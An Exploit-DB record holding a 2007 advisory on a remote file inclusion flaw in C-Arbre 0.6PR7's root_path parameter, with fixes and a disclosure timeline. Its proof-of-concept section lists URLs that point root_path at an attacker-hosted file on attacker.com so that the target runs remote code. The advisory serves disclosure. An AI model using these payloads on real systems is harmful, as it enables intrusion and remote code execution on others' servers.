{
  "id": "3583",
  "title": "C-Arbre 0.6PR7 - &#039;ROOT_PATH&#039; Remote File Inclusion",
  "cve": "CVE-2007-1721",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_78$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_78$2007] C-Arbre <= 0.6PR7 (root_path) Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : March, 26th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv78-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : C-Arbre  \r\nversion       : <= 0.6PR7\r\nVendor        : http://realink.org/\r\nDownload      : http://fresh.t-systems-sfr.com/unix/src/www/c-arbre_0.6PR7_full.tar.gz\r\nDescription :\r\n\r\nC-Arbre is an integrated Intranet/Web software suite oriented towards knowledge management. Some of its key features include a CMS, \r\na documents repository, handling of collaborative work and editions, templates engineering, support for DocBook XML, XHTML and Wiki style, permissions and work flow,\r\na search engine with full text indexing, logging of actions, a cache system, groupware tools (calendar, Web mail, mailing lists, etc.), \r\nautomatic generation of a Web portal, and internationalization of the interface.\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n- Invalid include function at lib/Richtxt_functions.inc.php :  \r\n  \t\r\n----------------lib/Richtxt_functions.inc.php-------------------\r\n<?php\r\n//try to integrate the wikimedia engine functions\r\ninclude_once(\"$root_path/include/Wikitxt_functions.inc.php\");\r\n\r\n...\r\n----------------------------------------------------------------\r\n\r\n\r\nInput passed to the \"root_path\" parameter in lib/Richtxt_functions.inc.php is not properly verified before being used to include files. \r\nThis can be exploited to include arbitrary files from local or external resources.\r\nSuccessful exploitation requires that \"register_globals\" is enabled.\r\n\r\nalso affected files :\r\nlib/adddocfile.php\r\nlib/auth_check.php\r\nlib/browse_current_category.inc.php\r\nlib/docfile_details.php\r\nlib/main.php\r\nlib/mainarticle.php\r\nlib/maindocfile.php\r\nlib/modify.php\r\nlib/new.php\r\nlib/resource_details.php\r\nlib/smallsearch.php\r\nmwiki/LocalSettings.php\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~~\r\n\r\nhttp://www.target.com/[C-Abre_path]/lib/Richtxt_functions.inc.php?root_path=http://attacker.com/evil?\r\nhttp://www.target.com/[C-Abre_path]/lib/adddocfile.php?root_path=http://attacker.com/evil?\r\nhttp://www.target.com/[C-Abre_path]/lib/auth_check.php?root_path=http://attacker.com/evil?\r\nhttp://www.target.com/[C-Abre_path]/lib/browse_current_category.inc.php?root_path=http://attacker.com/evil?\r\nhttp://www.target.com/[C-Abre_path]/lib/docfile_details.php?root_path=http://attacker.com/evil?\r\nhttp://www.target.com/[C-Abre_path]/lib/main.php?root_path=http://attacker.com/evil?\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn off register_globals\r\n\r\n\r\nNotification:\r\n~~~~~~~\r\n- 19-03-2007 bugs found\r\n- 26-03-2007 vendor contacted\r\n- 27-03-2007 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-03-26]",
  "url": "https://www.exploit-db.com/exploits/3583"
}